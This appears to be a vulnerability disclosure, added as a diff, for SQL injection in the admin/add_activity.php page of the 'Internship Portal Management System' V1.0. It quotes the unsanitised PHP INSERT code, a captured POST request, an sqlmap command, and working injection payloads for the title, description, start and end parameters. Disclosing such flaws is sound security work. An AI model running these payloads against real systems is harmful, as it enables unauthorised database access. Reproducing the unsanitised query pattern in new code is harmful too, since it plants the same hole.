@@ -1,0 +1,88 @@
+Internship Portal Management System - SQL Injection on (admin/add_activity.php) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/11712/internship-portal-management-system.html 
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+add_activity.php
+On this page,title/description/start/end parameters are vulnerable to SQL Injection Attack 
+
+Source Code(intern_sys/admin/add_activity.php):
+if(ISSET($_POST['save_activity'])){
+		$title = $_POST['title'];
+		$description = $_POST['description'];
+		$start = $_POST['start'];
+		$end = $_POST['end'];
+		$month = date("M", strtotime($_POST['start']));
+		$year = date("Y", strtotime($_POST['start']));
+		$conn->query("INSERT INTO `activity` VALUES('', '$title', '$description', '$start', '$end', '$month', '$year')") or die($conn->error);
+		header('location: activity.php');
+	}
+
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+Request:
+POST /intern_sys/admin/add_activity.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 161
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=bpfjr9o3euj8d6ognte8obmo85
+Origin: http://localhost
+Referer: http://localhost/intern_sys/admin/activity.php
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+description=1&end=2024-05-01&save_activity=&start=2024-04-17&title=1
+
+-> sqlmap -r 1.txt(above requests package) --batch
+
+Output:
+---
+Parameter: title (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: description=1&end=2024-05-01&save_activity=&start=2024-04-17&title=1' RLIKE (SELECT (CASE WHEN (4736=4736) THEN 1 ELSE 0x28 END)) AND 'tDdA'='tDdA
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: description=1&end=2024-05-01&save_activity=&start=2024-04-17&title=1' AND EXTRACTVALUE(5462,CONCAT(0x5c,0x716b6a7671,(SELECT (ELT(5462=5462,1))),0x7162717a71)) AND 'AIvy'='AIvy
+---
+---
+Parameter: description (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: description=1' RLIKE (SELECT (CASE WHEN (2578=2578) THEN 1 ELSE 0x28 END)) AND 'MkUR'='MkUR&end=2024-05-01&save_activity=&start=2024-04-17&title=1
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: description=1' AND EXTRACTVALUE(4073,CONCAT(0x5c,0x716b6a7671,(SELECT (ELT(4073=4073,1))),0x7162717a71)) AND 'xwIO'='xwIO&end=2024-05-01&save_activity=&start=2024-04-17&title=1
+---
+---
+Parameter: start (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: description=1&end=2024-05-01&save_activity=&start=2024-04-17' RLIKE (SELECT (CASE WHEN (7149=7149) THEN 0x323032342d30342d3137 ELSE 0x28 END)) AND 'OjzR'='OjzR&title=1
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: description=1&end=2024-05-01&save_activity=&start=2024-04-17' AND EXTRACTVALUE(2319,CONCAT(0x5c,0x716b6a7671,(SELECT (ELT(2319=2319,1))),0x7162717a71)) AND 'Ozfw'='Ozfw&title=1
+---
+---
+Parameter: end (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: description=1&end=2024-05-01' RLIKE (SELECT (CASE WHEN (7516=7516) THEN 0x323032342d30352d3031 ELSE 0x28 END)) AND 'EOqg'='EOqg&save_activity=&start=2024-04-17&title=1
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: description=1&end=2024-05-01' AND EXTRACTVALUE(4207,CONCAT(0x5c,0x716b6a7671,(SELECT (ELT(4207=4207,1))),0x7162717a71)) AND 'dgiF'='dgiF&save_activity=&start=2024-04-17&title=1
+---
+
